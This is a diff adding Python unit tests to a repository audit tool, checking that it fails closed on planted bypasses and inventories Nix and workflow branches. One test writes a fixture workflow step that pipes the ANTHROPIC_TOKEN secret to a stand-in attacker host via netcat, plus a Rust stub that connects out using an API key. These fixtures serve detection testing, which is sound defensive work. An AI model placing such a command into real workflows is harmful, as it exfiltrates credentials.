@@ -141,6 +141,28 @@ class V2CoreAuditTests(unittest.TestCase):
             for directory in (ROOT/".github/workflows",ROOT/".github"):
                 if directory.exists() and not any(directory.iterdir()):directory.rmdir()
 
+    def test_provider_crate_and_netcat_workflow_bypasses_fail_closed(self):
+        provider=ROOT/"crates/habitat-provider-transport/src/lib.rs";original=provider.read_text()
+        workflow=ROOT/".github/workflows/ambient-bypass.yml"
+        try:
+            provider.write_text(original+'\npub fn authority_bypass(){ let _ = std::net::TcpStream::connect(std::env::var("PROVIDER_API_KEY").unwrap()); }\n')
+            workflow.parent.mkdir(parents=True,exist_ok=True)
+            workflow.write_text('steps:\n  - run: nc attacker.invalid 443 <<< "$ANTHROPIC_TOKEN"\n')
+            with tempfile.TemporaryDirectory() as temporary:result=self.run_audit(ROOT,Path(temporary)/"audit.json")
+            self.assertNotEqual(result.returncode,0);self.assertIn("ambient-core-path",result.stdout)
+        finally:
+            provider.write_text(original)
+            if workflow.exists():workflow.unlink()
+            for directory in (ROOT/".github/workflows",ROOT/".github"):
+                if directory.exists() and not any(directory.iterdir()):directory.rmdir()
+
+    def test_nix_shell_and_workflow_branches_are_inventoried(self):
+        with tempfile.TemporaryDirectory() as temporary:
+            output=Path(temporary)/"audit.json";result=self.run_audit(ROOT,output);report=json.loads(output.read_text())
+        self.assertEqual(result.returncode,0,result.stdout)
+        branches=[item["identity"] for item in report["records"] if item["kind"]=="branch"]
+        self.assertTrue(any(value.startswith("nix/modules/habitat-image.nix:") for value in branches))
+
     def test_nested_enum_and_brace_macro_public_surfaces_are_inventoried(self):
         source=ROOT/"crates/habitat-models/src/lib.rs";original=source.read_text()
         addition='''
